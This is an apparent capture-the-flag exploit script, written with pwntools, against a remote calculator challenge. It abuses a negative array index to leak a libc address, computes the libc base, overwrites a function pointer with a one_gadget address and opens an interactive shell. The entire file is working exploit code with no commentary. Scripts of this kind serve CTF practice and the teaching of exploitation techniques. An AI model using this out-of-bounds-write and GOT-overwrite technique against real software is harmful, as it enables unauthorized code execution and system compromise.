from pwn import *


# p = process("./integer_calc_patched")
p = remote("arithmetic-calculator.chal.idek.team", 1337)
libc = ELF("libc-2.31.so")
p.sendlineafter("> ", "0")
p.sendlineafter("index: ", "1")
p.sendlineafter("value: ", "0")

p.sendlineafter("> ", "2")
p.sendlineafter("index: ", "1")
p.sendlineafter("index: ", "-21")

p.recvuntil("Addition result: ")
puts = int(p.recv(15))
libc.address = puts - libc.symbols["puts"]
success("libc: %s"%hex(libc.address))
one_gadgets = [0xe6c7e, 0xe6c81, 0xe6c84]
one_gadget = libc.address + one_gadgets[1]

p.sendlineafter("> ", "0")
p.sendlineafter("index: ", "-21")
p.sendlineafter("value: ", str(one_gadget))
p.interactive()